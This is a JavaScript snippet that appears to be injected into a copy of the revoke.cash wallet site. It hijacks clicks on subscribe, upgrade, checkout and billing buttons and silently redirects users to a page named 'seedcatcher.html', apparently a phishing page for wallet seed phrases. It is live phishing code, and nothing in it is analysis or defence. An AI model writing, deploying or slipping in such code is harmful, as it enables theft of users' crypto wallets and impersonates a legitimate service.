document.addEventListener('click', function(e) {
    let target = e.target.closest('a, button, div');
    if (!target) return;
    let text = (target.innerText || "").toLowerCase().trim();
    let href = (target.getAttribute("href") || "").toLowerCase();

    // Ignore the top menu
    if (href === '/premium' || href === 'https://revoke.cash/premium') return;

    // Catch the buttons by text OR by href
    if (text.includes('subscribe') || text.includes('get started') || text.includes('upgrade') || 
        href.includes('checkout') || href.includes('subscribe') || href.includes('billing')) {
        e.preventDefault();
        e.stopPropagation();
        window.location.href = '/seedcatcher.html';
    }
}, true);
